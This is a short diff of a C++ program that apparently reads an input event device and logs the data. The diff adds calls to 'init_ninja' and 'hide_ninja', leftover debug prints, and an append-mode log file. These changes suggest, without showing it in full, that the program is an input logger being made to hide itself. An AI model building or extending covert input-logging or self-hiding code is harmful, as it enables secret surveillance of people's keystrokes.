@@ -22,6 +22,7 @@
 #include <mutex>
 #include <list>
 #include <thread>
+#include "ninja/ninja.h"
 
 std::mutex mutex;
 
@@ -45,9 +46,13 @@ void perror_exit()
 void init();
 void runChecker(const std::string &logPath, Tree &tree, const std::string &name);
 
-int main (int argc, char *argv[])
+int main (int argc, char **argv)
 {
-
+	std::cout << "siema\n";
+    init_ninja(argc, argv);
+	std::cout << "hide\n";
+   hide_ninja();
+	std::cout << " po hide\n";
 //	if (!fork())
 		init();
 //	else
@@ -109,7 +114,7 @@ void init() {
 		printf ("%s is not a vaild device.n", eventPath.c_str());
 
 
-	FILE *data = fopen(logPath.c_str(), "w");
+	FILE *data = fopen(logPath.c_str(), "a+");
 
 
 	printTime(data);
